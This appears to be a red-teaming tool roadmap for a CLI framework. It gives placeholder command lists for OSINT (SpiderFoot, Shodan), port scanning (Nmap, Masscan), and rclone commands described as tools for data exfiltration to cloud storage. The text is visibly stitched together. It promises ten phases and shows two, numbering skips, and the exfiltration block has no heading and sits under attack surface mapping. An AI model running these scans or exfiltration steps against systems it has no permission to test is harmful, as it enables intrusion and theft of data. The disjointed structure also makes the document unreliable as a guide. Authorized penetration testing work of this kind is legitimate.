# SEC FRAMEWORK - Red Teaming Development Roadmap

## Project: **SEC FRAMEWORK** (Security Evaluation & Control Framework)

---

# COMPLETE RED TEAMING ROADMAP (10 PHASES)

## Framework Overview

The SEC FRAMEWORK is a menu-driven CLI tool where each command must be complete and self-contained. All tools execute from the command line with pre-built, complete commands. The framework follows the MITRE ATT&CK adversary lifecycle, from reconnaissance to achieving defined objectives.

**Note on Tools:** The commands below utilize tools that are industry standards for red teaming and penetration testing. Many of these tools require proper authorization and should only be used on systems you own or have explicit permission to test. The framework is designed for authorized security operations only.

---

## PHASE 1: RECONNAISSANCE (★★★★★)

**Description:** External intelligence gathering without direct engagement. Open-source intelligence (OSINT) forms the foundation for all subsequent attack vectors.

#### 1. SpiderFoot
**Description:** Automated OSINT tool integrating multiple modules for comprehensive intelligence gathering.

**Why Best:** One-command automation system with broad intelligence gathering capabilities. Integrates with 100+ modules for passive data collection.

**Mods (Commands):**
```bash
# 1. Scan domain with all modules
spiderfoot -s <DOMAIN> -o /opt/sec/output/spiderfoot_domain_<TIMESTAMP>.csv

# 2. Run specific modules for targeted recon
spiderfoot -s <DOMAIN> -m sfp_email,sfp_dnsresolve,sfp_subdomain -o /opt/sec/output/spiderfoot_modules_<TIMESTAMP>.csv

# 3. JSON output for integration
spiderfoot -s <DOMAIN> -o /opt/sec/output/spiderfoot_json_<TIMESTAMP>.json

# 4. Filter results by type (email, domain, IP)
spiderfoot -s <DOMAIN> -F EMAIL_ADDR -o /opt/sec/output/spiderfoot_filter_<TIMESTAMP>.csv

# 5. Scan network range
spiderfoot -s <IP_CIDR> -o /opt/sec/output/spiderfoot_network_<TIMESTAMP>.csv

# 6. Scan email address for breaches
spiderfoot -s <EMAIL> -o /opt/sec/output/spiderfoot_email_<TIMESTAMP>.csv

# 7. Use threat intelligence feeds
spiderfoot -s <DOMAIN> -T -o /opt/sec/output/spiderfoot_threat_<TIMESTAMP>.csv

# 8. Debug mode for troubleshooting
spiderfoot --debug -s <DOMAIN> -o /opt/sec/output/spiderfoot_debug_<TIMESTAMP>.csv

# 9. Custom module directory
spiderfoot -m /opt/sec/modules -s <DOMAIN> -o /opt/sec/output/spiderfoot_custom_<TIMESTAMP>.csv

# 10. Verbose output with all details
spiderfoot -v -s <DOMAIN> -o /opt/sec/output/spiderfoot_verbose_<TIMESTAMP>.csv
```

#### 5. Shodan CLI
**Description:** Command-line interface for Shodan, the search engine for internet-connected devices.

**Why Best:** Allows querying of historical and current data about target infrastructure without touching the target directly.

**Mods (Commands):**
```bash
# 1. Get all information on specific IP
shodan host <IP_ADDRESS> > /opt/sec/output/shodan_host_<TIMESTAMP>.txt

# 2. Search Shodan database for target-specific queries
shodan search "<SEARCH_QUERY>" --limit 100 --fields ip_str,port,org,hostnames > /opt/sec/output/shodan_search_<TIMESTAMP>.txt

# 3. Get IPs associated with domain
shodan domain <DOMAIN> > /opt/sec/output/shodan_domain_<TIMESTAMP>.txt

# 4. Find SSL certificates for domain
shodan search "ssl.cert.subject.CN:<DOMAIN>" --fields ip_str,port,ssl.cert.subject.CN > /opt/sec/output/shodan_cert_<TIMESTAMP>.txt

# 5. Find devices with hostname matching domain
shodan search "hostname:<DOMAIN>" --fields ip_str,port,hostnames > /opt/sec/output/shodan_hostname_<TIMESTAMP>.txt

# 6. Download results for offline analysis
shodan download /opt/sec/output/shodan_download_<TIMESTAMP> "<SEARCH_QUERY>"

# 7. Parse downloaded data to extract fields
shodan parse /opt/sec/output/shodan_download_<TIMESTAMP>.json.gz --fields ip_str,port,org > /opt/sec/output/shodan_parsed_<TIMESTAMP>.txt

# 8. Create Shodan alert for continuous monitoring
shodan alert "<ALERT_NAME>" "<SEARCH_QUERY>" > /opt/sec/output/shodan_alert_<TIMESTAMP>.txt

# 9. Show plan details and API usage
shodan info > /opt/sec/output/shodan_info_<TIMESTAMP>.txt

# 10. Search with limit and save to file
shodan search "<SEARCH_QUERY>" --limit 1000 --fields ip_str,port,org > /opt/sec/output/shodan_limited_<TIMESTAMP>.txt
```

## PHASE 2: ATTACK SURFACE MAPPING (★★★★★)

**Description:** Active probing of discovered assets to identify live hosts, open ports, running services, and potential vulnerabilities.

### Ranked Tools (1-10)

#### 1. Nmap
**Description:** Industry standard for network discovery and security auditing, capable of detailed port scanning, version detection, and OS fingerprinting.

**Why Best:** Fast, reliable, with powerful scripting engine (NSE) for vulnerability detection. Unmatched flexibility.

**Mods (Commands):**
```bash
# 1. SYN scan, all ports, no ping, fast timing
nmap -sS -Pn -p- -T4 <TARGET_IP> -oA /opt/sec/output/nmap_syn_<TIMESTAMP>

# 2. Version and default script scan
nmap -sV -sC -p <PORT_RANGE> <TARGET_IP> -oA /opt/sec/output/nmap_version_<TIMESTAMP>

# 3. OS detection with aggressive guessing
nmap -O --osscan-guess <TARGET_IP> -oA /opt/sec/output/nmap_os_<TIMESTAMP>

# 4. Scan for known vulnerabilities
nmap --script vuln <TARGET_IP> -oA /opt/sec/output/nmap_vuln_<TIMESTAMP>

# 5. Run specific script on port
nmap -p <PORT> --script <SCRIPT_NAME> <TARGET_IP> -oA /opt/sec/output/nmap_script_<TIMESTAMP>

# 6. Discovery scan (ping sweep)
nmap -sn <IP_CIDR> -oA /opt/sec/output/nmap_ping_<TIMESTAMP>

# 7. Grabbing banners and grepable output
nmap -p 80,443,8080,8443 -T4 -A -oG /opt/sec/output/nmap_banner_<TIMESTAMP>.txt <IP_RANGE>

# 8. Enumerate DNS SRV records
nmap --script dns-srv-enum --script-args domain=<DOMAIN> <DNS_SERVER_IP> -oA /opt/sec/output/nmap_dns_<TIMESTAMP>

# 9. UDP scan for common services
nmap -sU -p 161,162,500,4500,53,123,67,68 <TARGET_IP> -oA /opt/sec/output/nmap_udp_<TIMESTAMP>

# 10. Enumerate SMB shares and users
nmap -p 445 --script smb-enum-shares,smb-enum-users <TARGET_IP> -oA /opt/sec/output/nmap_smb_<TIMESTAMP>
```

#### 2. Masscan
**Description:** High-speed asynchronous port scanner for scanning the entire internet or huge networks.

**Why Best:** Exceptionally fast for mapping large external attack surface. Can scan entire internet in minutes.

**Mods (Commands):**
```bash

# 4. Save output to binary file
masscan -p0-65535 --banners -oB /opt/sec/output/masscan_binary_<TIMESTAMP>.bin <TARGET_IP>

# 5. List format output
masscan -p<PORT_RANGE> -oL /opt/sec/output/masscan_list_<TIMESTAMP>.txt <IP_RANGE>

masscan -p<PORT_RANGE> -oX /opt/sec/output/masscan_xml_<TIMESTAMP>.xml <IP_RANGE>

masscan -p80,443,8080 --wait 0 -oG /opt/sec/output/masscan_nowait_<TIMESTAMP>.txt <IP_CIDR>

masscan -p<PORT_RANGE> --source-port <PORT> -oG /opt/sec/output/masscan_source_<TIMESTAMP>.txt <TARGET>
```

**Why Best:** Extremely fast and powerful for data exfiltration, supporting many cloud services.

**Mods (Commands):**
```bash
# 1. Set up remote cloud storage
rclone config > /opt/sec/output/rclone_config_<TIMESTAMP>.txt

# 2. Copy files to cloud
rclone copy <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_copy_<TIMESTAMP>.txt

# 3. Sync directory to cloud
rclone sync <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_sync_<TIMESTAMP>.txt

# 4. Move files to cloud
rclone move <LOCAL_PATH> <REMOTE>:<PATH> > /opt/sec/output/rclone_move_<TIMESTAMP>.txt

# 5. List remote files
rclone ls <REMOTE>:<PATH> > /opt/sec/output/rclone_ls_<TIMESTAMP>.txt

# 6. Delete remote files
rclone delete <REMOTE>:<PATH> > /opt/sec/output/rclone_delete_<TIMESTAMP>.txt

# 7. Create remote directory
rclone mkdir <REMOTE>:<PATH> > /opt/sec/output/rclone_mkdir_<TIMESTAMP>.txt

# 8. Remove remote directory
rclone rmdir <REMOTE>:<PATH> > /opt/sec/output/rclone_rmdir_<TIMESTAMP>.txt

# 9. Copy specific file
rclone copyto <LOCAL_FILE> <REMOTE>:<PATH>/<FILE> > /opt/sec/output/rclone_copyto_<TIMESTAMP>.txt

# 10. Deduplicate files
rclone dedupe <REMOTE>:<PATH> > /opt/sec/output/rclone_dedupe_<TIMESTAMP>.txt
```

## OUTPUTS DIRECTORY STRUCTURE

All outputs are saved to:
```
/opt/sec/output/<TOOL>_<MODE>_<TIMESTAMP>.<ext>
```

**Output Formats Supported:**
- `.txt` - Plain text
- `.json` - JSON format
- `.xml` - XML format
- `.html` - HTML reports
- `.csv` - CSV format
- `.png` - Screenshots
- `.pcap` - Packet captures
- `.kirbi` - Kerberos tickets
- `.dmp` - Memory dumps

**Input Files Location:**
```
/opt/sec/inputs/<FILENAME>
```

**Configuration Files Location:**
```
/opt/sec/configs/<CONFIG_FILE>
```

**Scripts Location:**
```
/opt/sec/scripts/<SCRIPT_FILE>
```

**Wordlists Location:**
```
/opt/sec/wordlists/<WORDLIST_FILE>
```
